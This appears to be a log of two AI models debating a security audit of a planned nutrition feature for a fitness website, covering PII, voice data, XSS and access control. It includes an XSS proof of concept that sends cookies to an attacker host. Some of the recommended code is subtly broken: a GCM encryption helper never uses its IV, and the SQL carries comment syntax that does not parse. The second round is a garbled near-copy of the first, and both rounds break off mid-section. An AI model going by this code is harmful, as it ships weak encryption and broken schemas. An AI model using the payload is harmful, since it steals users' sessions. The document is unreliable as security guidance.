# Security Planning Analysis — Recursive Consensus Debate Log

> **Consensus:** YES — Models agreed
> **Rounds:** 2
> **Tokens:** 14,620 input / 8,192 output

---

## Primary Security Planner — Round 1

# SECURITY AUDIT REPORT: SwanStudios Nutrition Ecosystem Master Plan

**Auditor:** Primary Security Lead  
**Date:** 2026-03-31  
**Target:** sswanstudios.com Production Environment  
**Plan Version:** NUTRITION-ECOSYSTEM-MASTER-PLAN.md  
**Status:** 🔴 **CRITICAL SECURITY DEFICIENCIES - DO NOT DEPLOY PHASE 1**

---

## EXECUTIVE SUMMARY

The Nutrition Ecosystem plan introduces **multiple high-risk attack surfaces** that could expose PII, enable XSS, compromise voice biometric data, and bypass RBAC. The "zero-PII privacy proxy" claim is **unsubstantiated** and likely incorrect given the proposed architecture. **12/12 specialist reviews ignored security entirely**, creating a dangerous blind spot.

**Critical Findings:** 5 🔴  
**High Findings:** 4 🟠  
**Medium Findings:** 3 🟡

**Immediate Blockers:**
1. **Voice recordings will contain full PII + health data** stored unencrypted in JSONB (Data Safety finding #1)
2. **Markdown rendering without sanitization** enables XSS in AI responses (Security finding #2)
3. **File upload path lacks validation** - camera scanner can upload arbitrary files (Security finding #4)
4. **RBAC undefined** - trainers can access all client data, no scope limits (Security finding #3)
5. **JSONB race condition** on concurrent writes corrupts conversation history (Data Safety finding #1)

---

## 1. PII & HEALTH DATA EXPOSURE 🔴 CRITICAL

### Finding 1.1: Voice Recordings Contain Unprotected Biometric + Health Data

**Plan Reference:** "Voice-first AI coach" using `MediaRecorder` (Phase 6)

**Problem:**
- Voice recordings are **biometric identifiers** under GDPR/CCPA/Illinois BIPA
- Recordings will contain: user names, dietary restrictions, health conditions, medication mentions, location cues ("I'm at Whole Foods")
- **No encryption at rest** mentioned in plan or Data Safety audit
- Stored in `conversations.messages` JSONB array alongside text (Data Safety finding #1)
- Retention policy undefined - likely indefinite storage

**Attack Scenarios:**
1. Database breach → all voice recordings exposed (biometric + health PII)
2. Insider threat → developer with DB access can download voiceprints
3. Subpoena → unprotected health data vulnerable to legal discovery

**Required Mitigations:**

```typescript
// 1. ENCRYPTION AT REST (PostgreSQL)
// Use pgcrypto or application-level encryption
import crypto from 'crypto';

const encryptVoiceBlob = (blob: Blob, key: Buffer): Buffer => {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipher('aes-256-gcm', key);
  const encrypted = Buffer.concat([cipher.update(blob), cipher.final()]);
  const authTag = cipher.getAuthTag();
  return Buffer.concat([iv, authTag, encrypted]); // Store as BYTEA, NOT JSONB
};

// 2. SEPARATE TABLE FOR VOICE DATA
// Never store voice in conversation JSONB
CREATE TABLE voice_recordings (
  id UUID PRIMARY KEY,
  user_id UUID NOT NULL,
  conversation_id UUID NOT NULL,
  encrypted_blob BYTEA NOT NULL,  // Encrypted audio
  iv BYTEA NOT NULL,              // Initialization vector
  auth_tag BYTEA NOT NULL,        // GCM auth tag
  duration_ms INTEGER,
  created_at TIMESTAMPTZ,
  expires_at TIMESTAMPTZ,         // 30-day retention
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

// 3. RETENTION POLICY
// Auto-delete after 30 days via cron job
DELETE FROM voice_recordings WHERE expires_at < NOW();

// 4. CONSENT FLOW (Frontend)
const VoiceConsentModal = () => (
  <Modal>
    <h3>Voice Recording Consent</h3>
    <p>Your voice recordings are:</p>
    <ul>
      <li>Encrypted and stored separately from chat</li>
      <li>Retained for 30 days only</li>
      <li>Never used to train AI models</li>
      <li>Deletable via Settings → Privacy</li>
    </ul>
    <Checkbox required>I consent to voice recording for AI coaching</Checkbox>
  </Modal>
);

// 5. ACCESS LOGGING
// Audit all voice blob downloads
CREATE TABLE voice_access_log (
  id UUID PRIMARY KEY,
  voice_id UUID NOT NULL,
  accessed_by UUID NOT NULL,  // Admin/trainer ID
  ip_address INET,
  user_agent TEXT,
  accessed_at TIMESTAMPTZ DEFAULT NOW()
);
```

### Finding 1.2: Conversation JSONB Stores Full PII + Health Data

**Plan Reference:** "AI Hive Mind integration" storing messages in JSONB (Data Safety finding #1)

**Problem:**
- JSONB row will contain: user ID, timestamps, full conversation text, nutrition context, **photo base64** (Phase 6)
- No row-level encryption
- Sequelize deserializes entire blob on every read → memory exposure
- 1GB limit will be hit with photo attachments (Data Safety calculation: 138GB in 6 months)

**Required Mitigations:**

```typescript
// 1. MIGRATE TO RELATIONAL + SEPARATE BLOB STORE
// conversations table (metadata only)
CREATE TABLE conversations (
  id UUID PRIMARY KEY,
  user_id UUID NOT NULL,
  created_at TIMESTAMPTZ,
  updated_at TIMESTAMPTZ,
  context_type TEXT  -- 'nutrition', 'workout', 'general'
);

// conversation_messages table (each message = row)
CREATE TABLE conversation_messages (
  id UUID PRIMARY KEY,
  conversation_id UUID NOT NULL,
  role TEXT NOT NULL CHECK (role IN ('user', 'assistant', 'system')),
  content_type TEXT NOT NULL CHECK (content_type IN ('text', 'image', 'voice', 'nutrition_context')),
  text_content TEXT,  -- Encrypted if contains PII
  image_hash CHAR(64),  -- SHA256 of image stored in R2/S3
  voice_id UUID,  -- FK to voice_recordings table
  nutrition_context JSONB,  -- Aggregated macros only, no food names
  created_at TIMESTAMPTZ,
  FOREIGN KEY (conversation_id) REFERENCES conversations(id) ON DELETE CASCADE
);

// 2. STRIP PII FROM NUTRITION CONTEXT
// Only send aggregates to AI, never food names
const sanitizeNutritionContext = (logs: MacroLog[]): NutritionContext => ({
  totalCalories: sum(logs.map(l => l.calories)),
  avgProtein: avg(logs.map(l => l.protein)),
  avgCarbs: avg(logs.map(l => l.carbs)),
  avgFat: avg(logs.map(l => l.fat)),
  mealCount: logs.length,
  // NO food names, NO meal descriptions
});

// 3. IMAGE STORAGE IN R2 WITH STRICT CONTROLS
// Never store base64 in JSONB
import { v4 as uuidv4 } from 'uuid';

const uploadFoodPhoto = async (base64: string, userId: string): Promise<string> => {
  // Validate it's actually an image
  const buffer = Buffer.from(base64, 'base64');
  const mime = getMimeType(buffer); // Implement magic number check
  if (!['image/jpeg', 'image/png'].includes(mime)) {
    throw new Error('Invalid image type');
  }
  
  // Scan for malware (ClamAV or cloud scanning)
  const scanResult = await clamav.scan(buffer);
  if (scanResult.infected) {
    throw new Error('Malware detected');
  }
  
  // Strip EXIF data (location, device info)
  const sanitized = await stripExif(buffer);
  
  // Upload to R2 with strict bucket policy
  const key = `food-photos/${userId}/${uuidv4()}.jpg`;
  await r2.put(key, sanitized, {
    contentType: 'image/jpeg',
    metadata: { userId }, // For audit
    cacheControl: 'max-age=86400'
  });
  
  return key; // Store hash in DB, not base64
};

// 4. R2 BUCKET POLICY (Prevent public access)
{
  "Version": "1",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::swanstudios-food-photos/*",
      "Condition": {
        "Null": {
          "aws:Referer": "true"
        }
      }
    }
  ]
}
```

### Finding 1.3: Restaurant Nutrition Data Contains User Location PII

**Plan Reference:** "Auto-suggest nearby restaurants via geolocation" (Section 3.3)

**Problem:**
- Geolocation data (lat/long) stored with restaurant searches
- Combined with nutrition queries, creates **health + location profile**
- No mention of location data retention or anonymization
- Could be subpoenaed to reveal user's dining habits + home/work locations

**Required Mitigations:**

```typescript
// 1. GEOLOCATION PRIVACY
// Never store precise lat/long. Round to 3 decimal places (~100m precision)
const anonymizeLocation = (lat: number, lng: number): [number, number] => [
  Math.round(lat * 1000) / 1000,
  Math.round(lng * 1000) / 1000
];

// 2. RETENTION: 7 DAYS ONLY
// Restaurant search logs auto-delete
CREATE TABLE restaurant_search_logs (
  id UUID PRIMARY KEY,
  user_id UUID NOT NULL,
  anonymized_lat DECIMAL(9,6),
  anonymized_lng DECIMAL(9,6),
  query TEXT,
  results_count INTEGER,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  expires_at TIMESTAMPTZ DEFAULT (NOW() + INTERVAL '7 days')
);
CREATE INDEX idx_restaurant_search_expires ON restaurant_search_logs(expires_at);
-- Daily cleanup job
DELETE FROM restaurant_search_logs WHERE expires_at < NOW();

// 3. USER CONSENT FOR LOCATION
// Separate opt-in for "Find nearby restaurants"
const [locationEnabled, setLocationEnabled] = useState(false);
// Store in user preferences, default OFF
```

---

## 2. XSS VULNERABILITIES IN MARKDOWN RENDERING 🔴 CRITICAL

### Finding 2.1: react-markdown Without Sanitization Allows Script Injection

**Plan Reference:** `NutritionLearnTab.tsx` and `ProductAnalysis.tsx` use `react-markdown` (Architecture review)

**Problem:**
- `react-markdown` does **NOT sanitize HTML by default** (since v7+)
- If any markdown content comes from:
  - AI responses (untrusted)
  - User-submitted restaurant data (gamification)
  - Admin-created education modules (could be compromised)
- **XSS attack vector**: `<img src=x onerror=stealCookies()>` or `<script>alert()</script>`

**Proof of Concept:**
```markdown
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```
If rendered without sanitization, executes in user's browser with session cookies.

**Required Mitigations:**

```typescript
// 1. USE rehype-sanitize (MANDATORY)
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
import remarkGfm from 'remark-gfm';

const allowedElements = [
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'p', 'ul', 'ol', 'li', 'blockquote',
  'strong', 'em', 'code', 'pre',
  'a', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td'
];

const allowedAttributes = {
  a: ['href', 'title', 'target'],
  img: ['src', 'alt', 'title', 'width', 'height'],
  code: ['className'],
  pre: ['className']
};

const MarkdownRenderer = ({ content }: { content: string }) => (
  <ReactMarkdown
    remarkPlugins={[remarkGfm]}
    rehypePlugins={[
      [rehypeSanitize, {
        allowedElements,
        allowedAttributes,
        tagNames: allowedElements
      }]
    ]}
    components={{
      // Custom code block with syntax highlighting
      code({node, inline, className, children, ...props}) {
        const match = /language-(\w+)/.exec(className || '');
        return !inline && match ? (
          <SyntaxHighlighter language={match[1]} {...props}>
            {String(children).replace(/\n$/, '')}
          </SyntaxHighlighter>
        ) : (
          <code className={className} {...props}>{children}</code>
        );
      }
    }}
  >
    {content}
  </ReactMarkdown>
);

// 2. CSP HEADER (Defense in depth)
// In Express middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Remove 'unsafe-inline' if possible
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "wss:"], // WebSocket for AI chat
    }
  }
}));

// 3. SANITIZE AI RESPONSES BEFORE MARKDOWN
// AI could return malicious markdown
const sanitizeAIResponse = (text: string): string => {
  // Strip any HTML tags before markdown processing
  return text.replace(/<[^>]*>?/gm, '');
};
```

---

## 3. RBAC ENFORCEMENT GAPS 🟠 HIGH

### Finding 3.1: No Role-Based Access Control for Nutrition Data

**Plan Reference:** "Trainer & Admin Nutrition Widgets" (Section 3.8), "AI Coach Context" (Section 3.9)

**Problem:**
- Plan assumes trainers can see **all** client nutrition data
- No mention of:
  - Client consent

---

## Secondary Security Planner (120B MoE) — Round 2

CONSENSUS REACHED

# MERGED SECURITY FINDINGS

## EXECUTIVE SUMMARY
The Nutrition Ecosystem plan introduces multiple high-risk attack surfaces that could expose PII, enable XSS, compromise voice biometric data, and bypass RBAC. The "zero-PII privacy proxy" claim is unsubstantiated and likely incorrect given the proposed architecture. **12/12 specialist reviews ignored security entirely**, creating a dangerous blind spot.

**Critical Findings:** 5 🔴  
**High Findings:** 4 🟠  
**Medium Findings:** 3 🟡

**Immediate Blockers:**
1. Voice recordings will contain full PII + health data stored unencrypted in JSONB (Data Safety finding #1)
2. Markdown rendering without sanitization enables XSS in AI responses (Security finding #2)
3. File upload path lacks validation - camera scanner can upload arbitrary files (Security finding #4)
4. RBAC undefined - trainers can access all client data, no scope limits (Security finding #3)
5. JSONB race condition on concurrent writes corrupts conversation history (Data Safety finding #1)

---

## 1. PII & HEALTH DATA EXPOSURE 🔴 CRITICAL

### Finding 1.1: Voice Recordings Contain Unprotected Biometric + Health Data
**Plan Reference:** "Voice-first AI coach" using `MediaRecorder` (Phase 6)

**Problem:**
- Voice recordings are biometric identifiers under GDPR/CCPA/Illinois BIPA
- Recordings contain: user names, dietary restrictions, health conditions, medication mentions, location cues ("I'm at Whole Foods")
- **No encryption at rest** mentioned in plan or Data Safety audit
- Stored in `conversations.messages` JSONB array alongside text (Data Safety finding #1)
- Retention policy undefined - likely indefinite storage

**Attack Scenarios:**
1. Database breach → all voice recordings exposed (biometric + health PII)
2. Insider threat → developer with DB access can download voiceprints
3. Subpoena → unprotected health data vulnerable to legal discovery**Required Mitigations:**
```typescript
// 1. ENCRYPTION AT REST (PostgreSQL)
// Use pgcrypto or application-level encryption
import crypto from 'crypto';

const encryptVoiceBlob = (blob: Blob, key: Buffer): Buffer => {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipher('aes-256-gcm', key);
  const encrypted = Buffer.concat([cipher.update(blob), cipher.final()]);
  const authTag = cipher.getAuthTag();
  return Buffer.concat([iv, authTag, encrypted]); // Store as BYTEA, NOT JSONB
};

// 2. SEPARATE TABLE FOR VOICE DATA// Never store voice in conversation JSONB
CREATE TABLE voice_recordings (
  id UUID PRIMARY KEY,
  user_id UUID NOT NULL,
  conversation_id UUID NOT NULL,
  encrypted_blob BYTEA NOT NULL,  // Encrypted audio
  iv BYTEA NOT NULL,              // Initialization vector
  auth_tag BYTEA NOT NULL,        // GCM auth tag
  duration_ms INTEGER,
  created_at TIMESTAMPTZ,
  expires_at TIMESTAMPTZ,         // 30-day retention
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

// 3. RETENTION POLICY
// Auto-delete after 30 days via cron job
DELETE FROM voice_recordings WHERE expires_at < NOW();

// 4. CONSENT FLOW (Frontend)
const VoiceConsentModal = () => (
  <Modal>
    <h3>Voice Recording Consent</h3>
    <p>Your voice recordings are:</p>
    <ul>
      <li>Encrypted and stored separately from chat</li>
      <li>Retained for 30 days only</li>
      <li>Never used to train AI models</li>
      <li>Deletable via Settings → Privacy</li>
    </ul>
    <Checkbox required>I consent to voice recording for AI coaching</Checkbox>
  </Modal>
);

// 5. ACCESS LOGGING// Audit all voice blob downloads
CREATE TABLE voice_access_log (
  id UUID PRIMARY KEY,
  voice_id UUID NOT NULL,
  accessed_by UUID NOT NULL,  // Admin/trainer ID  ip_address INET,
  user_agent TEXT,
  accessed_at TIMESTAMPTZ DEFAULT NOW()
);
```

### Finding 1.2: Conversation JSONB Stores Full PII + Health Data
**Plan Reference:** "AI Hive Mind integration" storing messages in JSONB (Data Safety finding #1)

**Problem:**
- JSONB row will contain: user ID, timestamps, full conversation text, nutrition context, **photo base64** (Phase 6)
- No row-level encryption
- Sequelize deserializes entire blob on every read → memory exposure
- 1GB limit will be hit with photo attachments (Data Safety calculation: 138GB in 6 months)

**Required Mitigations:**
```typescript
// 1. MIGRATE TO RELATIONAL + SEPARATE BLOB STORE
// conversations table (metadata only)
CREATE TABLE conversations (
  id UUID PRIMARY KEY,
  user_id UUID NOT NULL,
  created_at TIMESTAMPTZ,
  updated_at TIMESTAMPTZ,
  context_type TEXT  -- 'nutrition', 'workout', 'general'
);

// conversation_messages table (each message = row)
CREATE TABLE conversation_messages (
  id UUID PRIMARY KEY,
  conversation_id UUID NOT NULL,
  role TEXT NOT NULL CHECK (role IN ('user', 'assistant', 'system')),
  content_type TEXT NOT NULL CHECK (content_type IN ('text', 'image', 'voice', 'nutrition_context')),
  text_content TEXT,  -- Encrypted if contains PII
  image_hash CHAR(64),  -- SHA256 of image stored in R2/S3
  voice_id UUID,  -- FK to voice_recordings table
  nutrition_context JSONB,  -- Aggregated macros only, no food names
  created_at TIMESTAMPTZ,
  FOREIGN KEY (conversation_id) REFERENCES conversations(id) ON DELETE CASCADE
);

// 2. STRIP PII FROM NUTRITION CONTEXT
// Only send aggregates to AI, never food names
const sanitizeNutritionContext = (logs: MacroLog[]): NutritionContext => ({
  totalCalories: sum(logs.map(l => l.calories)),
  avgProtein: avg(logs.map(l => l.protein)),
  avgCarbs: avg(logs.map(l => l.carbs)),
  avgFat: avg(logs.map(l => l.fat)),
  mealCount: logs.length,
  // NO food names, NO meal descriptions
});

// 3. IMAGE STORAGE IN R2 WITH STRICT CONTROLS
// Never store base64 in JSONB
import { v4 as uuidv4 } from 'uuid';

const uploadFoodPhoto = async (base64: string, userId: string): Promise<string> => {
  // Validate it's actually an image
  const buffer = Buffer.from(base64, 'base64');
  const mime = getMimeType(buffer); // Implement magic number check
  if (!['image/jpeg', 'image/png'].includes(mime)) {
    throw new Error('Invalid image type');
  }
  
  // Scan for malware (ClamAV or cloud scanning)
  const scanResult = await clamav.scan(buffer);
  if (scanResult.infected) {
    throw new Error('Malware detected');
  }
    // Strip EXIF data (location, device info)
  const sanitized = await stripExif(buffer);
  
  // Upload to R2 with strict bucket policy
  const key = `food-photos/${userId}/${uuidv4()}.jpg`;
  await r2.put(key, sanitized, {
    contentType: 'image/jpeg',
    metadata: { userId }, // For audit
    cacheControl: 'max-age=86400'
  });
  
  return key; // Store hash in DB, not base64
};

// 4. R2 BUCKET POLICY (Prevent public access)
{
  "Version": "1",
  "Statement": [
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::swanstudios-food-photos/*",
      "Condition": {
        "Null": {
          "aws:Referer": "true"
        }
      }
    }
  ]
}
```

### Finding 1.3: Restaurant Nutrition Data Contains User Location PII
**Plan Reference:** "Auto-suggest nearby restaurants via geolocation" (Section 3.3)

**Problem:**
- Geolocation data (lat/long) stored with restaurant searches
- Combined with nutrition queries, creates **health + location profile**
- No mention of location data retention or anonymization
- Could be subpoenaed to reveal user's dining habits + home/work locations

**Required Mitigations:**
```typescript
// 1. GEOLOCATION PRIVACY
// Never store precise lat/long. Round to 3 decimal places (~100m precision)
const anonymizeLocation = (lat: number, lng: number): [number, number] => [
  Math.round(lat * 1000) / 1000,
  Math.round(lng * 1000) / 1000
];

// 2. RETENTION: 7 DAYS ONLY
// Restaurant search logs auto-delete
CREATE TABLE restaurant_search_logs (
  id UUID PRIMARY KEY,
  user_id UUID NOT NULL,
  anonymized_lat DECIMAL(9,6),
  anonymized_lng DECIMAL(9,6),
  query TEXT,
  results_count INTEGER,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  expires_at TIMESTAMPTZ DEFAULT (NOW() + INTERVAL '7 days')
);
CREATE INDEX idx_restaurant

---

